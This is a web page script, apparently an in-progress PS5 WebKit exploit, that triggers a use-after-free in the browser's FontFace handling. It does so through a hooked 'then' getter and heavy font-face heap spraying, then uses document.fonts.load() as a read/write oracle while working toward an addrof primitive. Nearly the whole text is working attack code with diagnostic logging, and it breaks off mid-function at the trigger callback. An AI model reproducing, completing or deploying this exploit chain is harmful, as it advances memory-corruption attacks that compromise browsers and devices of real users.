<script>
"use strict";

// ============================================================
//  PS5 WebKit v13 - Load Oracle Primitive
//
//  KEY: load("1em trigger, x","AB") returns an RC face!
//  This gives us READ access to the confused entry.
//
//  STRATEGY:
//  1. Use load() to identify confused RC face
//  2. Delete it → call load() again → see what changes
//  3. Spray replacements → call load() → find replacement
//  4. If replacement appears via load() = WRITE-THROUGH
//  5. Use load() as information channel for addrof
// ============================================================

const O=document.getElementById("out");
const bp=document.getElementById("bp");
function bar(p){bp.style.width=p+"%"}
function hud(id,v){const e=document.getElementById(id);if(e)e.textContent=v}
function P(m,c){const s=document.createElement("span");if(c)s.className=c;
s.textContent=m+"\n";O.appendChild(s);O.scrollTop=O.scrollHeight;
try{console.log("[v13] "+m)}catch(e){}}
function Ok(m){P("✅ "+m,"ok")}function Fl(m){P("✘ "+m,"fl")}
function Wr(m){P("⚠ "+m,"wr")}function Hi(m){P("► "+m,"hi")}
function St(m){P("★ "+m+" ★","st")}function Dm(m){P(m,"dm")}
function Hd(m){P(m,"hd")}function Sep(){P("─".repeat(42),"dm")}

window.onerror=function(m,s,l){Fl("ERR: "+m+" @"+l)};

let keepAlive=[],holeFaces=[],reclaimFaces=[];
let uafTriggered=false,triggerFace=null;
let confusedRef=null,confusedIdx=-1;

const FB="d09GMgABAAAAAAJkAA4AAAAABiAAAAIQAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP0ZGVE0cGhwGYACCQggEEQgKcH0LCgABNgIkAxAEIAWEEAcyGy4FAI7Ctnlz5COJZMsihmWKh4f78Z573/0ZGIXRWLVZpRVNBz5LGmglcIJtH2hFs/L71vRPNg6FnRed2yOwAbJMJfRVCkhVAas6QCnP5701PYAm8AF8l8DegK66cR6mEGHAUS8K8ALFQCjz1m9GpK46tojEaUMI+PLzugVw1L1+g6Pdp10QoNuwKBKBQJW4q4V8mJ9xBx80vlmJDlJLBwDtADhxIz/D0Ya1YYmV/6ZePgIBgAmEBg1GEFgjBEZETYBSgpurYWj/ch78CyBaCUAkEgAQmj1O5W3E/1CCAu1o0I1+AIV5ERBV1dXSU+diLZ3nRV9OPep/9GPyZ/Ej398zrQyAl2Rh7bat/DBuWlu+rt026YeBG7HEWiTBtcafwuPKhODd1XFhmFr73R4rx+1LpKGZyEdolyDIR7hSoJlAAIAqpoBC8R6B0i5BIgS2SAC9niEApAChzzQCqc0uAo0ZFwhQ+vxCgBb9MYlAq744BSGqAxgjjBFIvVbQOKeKMuYfLSaEK7Yai2XguKmauX0HCg5t2NC0aubAChy/qmzUaj+jIBwDp8wtufXYHvxEVgIHtm05wG+yZ2mOGSQNC3Asy+sbTAq/FwbN6yCuJCftLedsSI0DzknNJsNUfOUqnng/9Fzes281/5JpNDqJaw3DWypomi41n5fDXAgJ/L/HCghqKARzIbLt1taqkzUt";
const FBb=(()=>{const s=atob(FB),b=new Uint8Array(s.length);
for(let i=0;i<s.length;i++)b[i]=s.charCodeAt(i);return b})();
function mkBuf(){const c=new Uint8Array(FBb.length);c.set(FBb);return c.buffer}

function fs(){void document.body.offsetTop;void document.documentElement.offsetHeight}
function addPads(n){const sh=document.getElementById("s").sheet;
for(let i=0;i<n;i++)sh.insertRule(
`@font-face{font-family:pad${i};src:url(np${i}.woff);unicode-range:U+E000}`,
sh.cssRules.length);fs()}
function addFlush(n){const st=document.createElement("style");st.id="flush";
document.head.appendChild(st);const sh=st.sheet;
for(let i=0;i<n;i++)sh.insertRule(
`@font-face{font-family:flush${i};src:url(nf${i}.woff);unicode-range:U+E000}`,
sh.cssRules.length);fs()}
function delFlush(){const e=document.getElementById("flush");
if(e&&e.sheet){while(e.sheet.cssRules.length)e.sheet.deleteRule(0);fs()}}
function killCk(){const f=new FontFace("ck"+keepAlive.length,"local(Helvetica)",
{unicodeRange:"U+E124"});document.fonts.add(f);keepAlive.push(f)}

async function ld(spec,text){
try{return await document.fonts.load(spec,text)}catch(e){return[]}
}

// ============================================================
//  PHASE 1: UAF
// ============================================================
function makeHoles(){
for(let i=0;i<4096;i++){const f=new FontFace("hole_"+i,mkBuf(),{
unicodeRange:"U+E1"+(i%16).toString(16),
style:i%2===0?"normal":"italic",
weight:String(100+(i%9)*100),
display:["auto","block","swap","fallback","optional"][i%5]});
document.fonts.add(f);holeFaces.push(f)}
fs();for(let i=1;i<holeFaces.length;i+=2)document.fonts.delete(holeFaces[i]);
fs();for(let i=0;i<4;i++){const t=[];for(let j=0;j<512;j++)t.push(new ArrayBuffer(4096))}
Ok("Holes")}

function spray(){
for(let i=0;i<4096;i++){const f=new FontFace("RC_"+i,mkBuf(),{
unicodeRange:"U+0041",style:"italic",weight:"900",display:"block"});
document.fonts.add(f);reclaimFaces.push(f)}fs();Ok("Spray")}

// ============================================================
//  PHASE 2: Identify via load()
// ============================================================
async function identifyConfused(){
Sep();Hd("IDENTIFY VIA load()");Sep();

const faces=await ld("1em trigger, x","AB");
P("load() returned "+faces.length+" faces:");

let rcFace=null;
for(let i=0;i<faces.length;i++){
const f=faces[i];
P("  ["+i+"] "+f.family+" "+f.style+" "+f.weight+" st="+f.status);
if(f.family&&f.family.startsWith("RC_")){
rcFace=f;
const m=f.family.match(/RC_(\d+)/);
if(m)confusedIdx=parseInt(m[1]);
confusedRef=f;
}
}

if(rcFace){
St("CONFUSED: "+rcFace.family);
hud("hR","RC:"+confusedIdx);

P("");Dm("Full property dump:");
const props=["family","style","weight","stretch","unicodeRange",
"variant","featureSettings","display","status"];
for(const p of props){
try{P("  "+p.padEnd(16)+"= "+rcFace[p])}catch(e){P("  "+p.padEnd(16)+"= ERR:"+e.message,"fl")}
}

// Check if we can get this face from document.fonts
P("");Dm("Cross-reference with document.fonts:");
let foundInFonts=false;
for(const f of document.fonts){
if(f===rcFace){
Hi("Same JS object found in document.fonts!");
foundInFonts=true;break;
}
}
if(!foundInFonts)Wr("Not found in document.fonts iteration");

return true;
}

Wr("No RC face in load() result");
return false;
}

// ============================================================
//  PHASE 3: load() Behavior Mapping
//  Understand exactly how load() behaves with the confusion
// ============================================================
async function mapLoadBehavior(){
Sep();Hd("load() BEHAVIOR MAPPING");Sep();

const tests=[
["1em trigger, x","AB"],
["1em trigger, x","A"],
["1em trigger, x","B"],
["1em trigger","A"],
["1em trigger","AB"],
["1em x","B"],
["1em x","A"],
["64px trigger","A"],
["64px x","B"],
["900 italic 1em trigger","A"],
["1em RC_"+confusedIdx,"A"],
["1em trigger, x, RC_"+confusedIdx,"AB"]
];

for(const[spec,text]of tests){
const faces=await ld(spec,text);
const fams=faces.map(f=>f.family+"("+f.weight+")").join(", ");
P("  load('"+spec+"','"+text+"') → "+faces.length+" ["+fams+"]",
faces.length>1?"hi":"dm");
}
}

// ============================================================
//  PHASE 4: Delete Confused + Respray
//  Delete the confused RC face, spray replacements,
//  check if load() returns a replacement
// ============================================================
async function deleteAndRespray(){
Sep();Hd("DELETE + RESPRAY");Sep();

if(!confusedRef){Fl("No confused face");return false}

P("");Dm("Step 1: Baseline load()");
const base=await ld("1em trigger, x","AB");
P("  Baseline: "+base.map(f=>f.family).join(", "));

P("");Dm("Step 2: Delete confused RC_"+confusedIdx);
try{
document.fonts.delete(confusedRef);
fs();
Ok("Deleted");
}catch(e){Fl("Delete: "+e.message);return false}

P("");Dm("Step 3: load() after delete");
const afterDel=await ld("1em trigger, x","AB");
P("  After delete: "+afterDel.length+" faces");
for(const f of afterDel){
P("    "+f.family+" "+f.style+" "+f.weight+" st="+f.status);
}

const rcAfter=afterDel.find(f=>f.family&&f.family.startsWith("RC_"));
if(rcAfter){
Hi("Still returns RC: "+rcAfter.family);
Dm("C++ object not freed or different RC took slot");
// Re-add and continue
try{document.fonts.add(confusedRef);fs()}catch(e){}
}else{
Hi("No RC in load() after delete!");
Dm("The confused entry was cleared");
}

P("");Dm("Step 4: Force GC");
for(let i=0;i<8;i++){const t=[];for(let j=0;j<256;j++)t.push(new ArrayBuffer(8192))}

P("");Dm("Step 5: Spray replacement faces");
const replacements=[];
for(let i=0;i<2048;i++){
const f=new FontFace("REPL_"+i,mkBuf(),{
unicodeRange:"U+0041",
style:i%3===0?"normal":"italic",
weight:String([100,400,700,900][i%4]),
display:["auto","block","swap","fallback"][i%4]
});
document.fonts.add(f);replacements.push(f);
}
fs();
Ok("Sprayed "+replacements.length+" REPL faces");

P("");Dm("Step 6: load() after spray");
const afterSpray=await ld("1em trigger, x","AB");
P("  After spray: "+afterSpray.length+" faces");
for(const f of afterSpray){
P("    "+f.family+" "+f.style+" "+f.weight+" st="+f.status+" display="+f.display,
f.family&&f.family.startsWith("REPL_")?"hi":"dm");
}

// Check for REPL face
const repl=afterSpray.find(f=>f.family&&f.family.startsWith("REPL_"));
if(repl){
St("REPLACEMENT FOUND: "+repl.family);
Hi("  style:   "+repl.style);
Hi("  weight:  "+repl.weight);
Hi("  display: "+repl.display);
Hi("  range:   "+repl.unicodeRange);

// FIND THE JS REFERENCE
P("");Hd("LOCATING JS REFERENCE");
const replRef=replacements.find(r=>r.family===repl.family);
if(replRef){
Ok("Found JS ref: "+replRef.family);

// TEST WRITE-THROUGH
P("");Hd("WRITE-THROUGH TEST");
const origWeight=replRef.weight;
try{
replRef.weight="200";fs();
const chk=await ld("1em trigger, x","AB");
const chkR=chk.find(f=>f.family===repl.family);
if(chkR){
P("  Write weight→200: load returns weight="+chkR.weight,
chkR.weight==="200"?"hi":"dm");
if(chkR.weight==="200")St("WRITE-THROUGH CONFIRMED!");
}
replRef.weight=origWeight;fs();
}catch(e){P("  weight readonly","dm")}

const origStyle=replRef.style;
try{
replRef.style="oblique";fs();
const chk2=await ld("1em trigger, x","AB");
const chkR2=chk2.find(f=>f.family===repl.family);
if(chkR2){
P("  Write style→oblique: load returns style="+chkR2.style,
chkR2.style==="oblique"?"hi":"dm");
if(chkR2.style==="oblique")St("STYLE WRITE-THROUGH!");
}
replRef.style=origStyle;fs();
}catch(e){P("  style readonly","dm")}

// TEST UNICODE RANGE WRITE
const origRange=replRef.unicodeRange;
try{
replRef.unicodeRange="U+0042";fs();
const chk3a=await ld("1em trigger, x","A");
const chk3b=await ld("1em trigger, x","B");
P("  Write range→U+0042: load(A)="+chk3a.length+" load(B)="+chk3b.length,
chk3a.length!==chk3b.length?"hi":"dm");
replRef.unicodeRange=origRange;fs();
}catch(e){P("  range readonly","dm")}
}else{
Wr("JS reference not found in replacements array");
}
}else{
Wr("No REPL face in load result");

// Try: Is the original RC still there?
const rcStill=afterSpray.find(f=>f.family&&f.family.startsWith("RC_"));
if(rcStill){
P("  Still returns RC: "+rcStill.family,"wr");
}

// Try: Re-add confused face and check
P("");Dm("Re-adding confused face...");
try{
// Find it in reclaimFaces
const origRC=reclaimFaces[confusedIdx];
if(origRC){
document.fonts.add(origRC);fs();
const afterReadd=await ld("1em trigger, x","AB");
P("  After re-add: "+afterReadd.map(f=>f.family).join(", "));
}
}catch(e){Fl("  "+e.message)}
}

// Cleanup replacements
for(const f of replacements)try{document.fonts.delete(f)}catch(e){}
fs();

// Restore original confused face
try{
const origRC=reclaimFaces[confusedIdx];
if(origRC&&!document.fonts.check("64px RC_"+confusedIdx,"A")){
// Not in document.fonts, re-add
}
}catch(e){}

return!!repl;
}

// ============================================================
//  PHASE 5: Alternative - Iterate document.fonts
//  Find the confused face by iterating ALL faces
//  and checking their properties via load()
// ============================================================
async function iterateAndMatch(){
Sep();Hd("ITERATE document.fonts");Sep();

P("");Dm("Counting faces by type...");
let rcCount=0,loadedRC=0,holeCount=0,otherCount=0;
for(const f of document.fonts){
if(f.family&&f.family.startsWith("RC_")){
rcCount++;
if(f.status==="loaded")loadedRC++;
}else if(f.family&&f.family.startsWith("hole_")){
holeCount++;
}else{
otherCount++;
}
}
P("  RC faces: "+rcCount+" (loaded: "+loadedRC+")");
P("  Hole faces: "+holeCount);
P("  Other: "+otherCount);

P("");Dm("Finding RC faces with status=loaded...");
const loadedRCs=[];
let idx=0;
for(const f of document.fonts){
if(f.family&&f.family.startsWith("RC_")&&f.status==="loaded"){
loadedRCs.push({ref:f,family:f.family,index:idx});
}
idx++;
}
P("  Loaded RC faces: "+loadedRCs.length);

if(loadedRCs.length>0&&loadedRCs.length<50){
Hi("Small number of loaded RC faces!");
P("");Dm("Testing each loaded RC via load():");
for(const rc of loadedRCs){
P("  "+rc.family+" style="+rc.ref.style+" weight="+rc.ref.weight);
}
}

// Try: load with specific RC family names
P("");Dm("load() for specific RC families:");
const testRCs=[0,1,2,3,50,100,confusedIdx||109,120,200,500,1000,2000,3000,4000];
for(const idx of testRCs){
const faces=await ld("64px RC_"+idx,"A");
if(faces.length>0){
P("  RC_"+idx+": "+faces.length+" faces (st="+faces[0].status+")","hi");
}else{
Dm("  RC_"+idx+": 0 faces");
}
}
}

// ============================================================
//  PHASE 6: Direct C++ Object Manipulation
//  Try to manipulate the C++ CSSFontFace through
//  the confused face's JS wrapper
// ============================================================
async function manipulateCppObject(){
Sep();Hd("C++ OBJECT MANIPULATION");Sep();

if(!confusedRef){Fl("No confused face");return}

// Try setting unusual property values that might
// corrupt the C++ object in a detectable way
P("");Dm("Testing property modifications:");

const mods=[
{prop:"weight",val:"99999",restore:"900"},
{prop:"weight",val:"0",restore:"900"},
{prop:"style",val:"oblique 45deg",restore:"italic"},
{prop:"display",val:"invalid",restore:"block"},
{prop:"unicodeRange",val:"U+0000-10FFFF",restore:"U+0041"},
{prop:"featureSettings",val:'"calt" 999',restore:"normal"},
{prop:"stretch",val:"ultra-expanded",restore:"normal"}
];

for(const m of mods){
try{
const orig=confusedRef[m.prop];
confusedRef[m.prop]=m.val;
fs();
const readback=confusedRef[m.prop];
const changed=readback!==orig;
P("  "+m.prop.padEnd(16)+": "+orig+" → "+m.val+" → readback="+readback+
(changed?" CHANGED":""),changed?"hi":"dm");

// Check if load() sees the change
const faces=await ld("1em trigger, x","AB");
const rc=faces.find(f=>f.family&&f.family.startsWith("RC_"));
if(rc){
const loadVal=rc[m.prop];
if(loadVal!==readback){
Hi("  LOAD SEES DIFFERENT VALUE: load."+m.prop+"="+loadVal);
}
}

confusedRef[m.prop]=m.restore;
fs();
}catch(e){
P("  "+m.prop.padEnd(16)+": ERR "+e.message,"fl");
}
}

// Try: Delete from document.fonts, modify, re-add
P("");Dm("Delete → modify → re-add test:");
try{
const origFam=confusedRef.family;
document.fonts.delete(confusedRef);
confusedRef.weight="100";
confusedRef.style="normal";
document.fonts.add(confusedRef);
fs();

const afterMod=await ld("1em trigger, x","AB");
const rc=afterMod.find(f=>f.family&&f.family.startsWith("RC_"));
if(rc){
P("  After del+mod+add: weight="+rc.weight+" style="+rc.style);
if(rc.weight==="100"&&rc.style==="normal"){
St("MODIFICATION VIA DELETE+RE-ADD WORKS!");
}
}

confusedRef.weight="900";
confusedRef.style="italic";
fs();
}catch(e){Fl("  "+e.message)}
}

// ============================================================
//  PHASE 7: addrof Construction
// ============================================================
async function attemptAddrof(){
Sep();Hd("ADDROF CONSTRUCTION");Sep();

P("");Dm("Attempting to build addrof from load() oracle...");

// Method 1: If load() returns a REPL face after delete+respray,
// and we can modify the REPL face's properties, we have:
// - WRITE: Modify REPL face properties
// - READ: load() returns the modified properties
// This is a read/write channel through the C++ selector!

// Method 2: If we can create a face whose C++ CSSFontFace
// contains a pointer we control, and read it back through
// load(), we can leak addresses

// Method 3: Create a face with a specific ArrayBuffer as font data.
// The CSSFontFace will store a reference to this buffer.
// If we can find the buffer's address, we have addrof.

P("");Dm("Method 3: Controlled ArrayBuffer as font data");
try{
const ctrlBuf=new ArrayBuffer(0x100);
const cv=new DataView(ctrlBuf);

// Write recognizable pattern
cv.setUint32(0,0x00010000,false); // TrueType magic
cv.setUint32(4,0,false);
for(let i=8;i<0x100;i+=4)cv.setUint32(i,0xCAFEBABE,false);

const ctrlFace=new FontFace("ctrlprobe",ctrlBuf,{
unicodeRange:"U+0041",style:"italic",weight:"900"
});
document.fonts.add(ctrlFace);fs();
P("  Controlled face status: "+ctrlFace.status);

// Check if this face appears in load()
const testLoad=await ld("64px ctrlprobe","A");
P("  load(ctrlprobe): "+testLoad.length+" faces");

// Check if the CSSFontFace processed our buffer
if(ctrlFace.status==="error"){
Dm("Font data was processed and rejected (expected)");
Dm("The C++ object has a pointer to our buffer!");
Hi("If we can find this pointer = addrof!");
}else if(ctrlFace.status==="loaded"){
Hi("Font was LOADED from our controlled buffer!");
Hi("We control the font's rendering data!");
}

document.fonts.delete(ctrlFace);fs();
}catch(e){Fl("  "+e.message)}

// Method 4: Use Float64Array with specific NaN values
// that might encode pointers
P("");Dm("Method 4: NaN-boxing address encoding");
try{
const nanBuf=new ArrayBuffer(0x40);
const nv=new Float64Array(nanBuf);
// Write specific doubles that when read as pointers
// would reveal memory layout
nv[0]=1.1;nv[1]=2.2;nv[2]=3.3;nv[3]=4.4;
nv[4]=NaN;nv[5]=-Infinity;nv[6]=Infinity;nv[7]=0;

const nanFace=new FontFace("nanprobe",nanBuf,{
unicodeRange:"U+0041",style:"italic",weight:"900"
});
document.fonts.add(nanFace);fs();
P("  NaN face status: "+nanFace.status);
document.fonts.delete(nanFace);fs();
}catch(e){Fl("  "+e.message)}

P("");Dm("Current primitive assessment:");
P("  READ:  load('1em trigger, x','AB') → confused face","hi");
P("  WRITE: Delete confused + add replacement","hi");
P("  ORACLE: load() returns face identity + properties","hi");
P("");
P("  Missing: address of any C++ object","wr");
P("  Missing: way to read raw C++ memory","wr");
P("");
P("  Possible path: WASM memory + load() oracle","dm");
P("  Possible path: GC + respray with typed arrays","dm");

hud("hP","PRIM:LOAD");
}

// ============================================================
//  Main
// ============================================================
window.onload=async()=>{
const ua=navigator.userAgent||"";
const m=ua.match(/PlayStation\s*5\/?\s*([0-9]+(?:\.[0-9]+)?)/i);
hud("hF","FW:"+(m?m[1]:"?"));

bar(5);makeHoles();

bar(15);triggerFace=new FontFace("trigger","local(Helvetica)",{unicodeRange:"U+0041"});
document.fonts.add(triggerFace);void triggerFace.loaded;
addPads(48);addFlush(768);Ok("Trigger");

bar(25);let fired=false;
Object.defineProperty(FontFace.prototype,"then",{configurable:true,
get(){if(!fired&&this===triggerFace){
fired=true;uafTriggered=true;hud("hU","UAF:✅");
St("UAF WINDOW OPEN");
killCk();document.getElementById("s").sheet.deleteRule(1);fs();
delFlush();for(let i=0;i<holeFaces.length;i+=4)try{document.fonts.delete(holeFaces[i])}catch(e){}
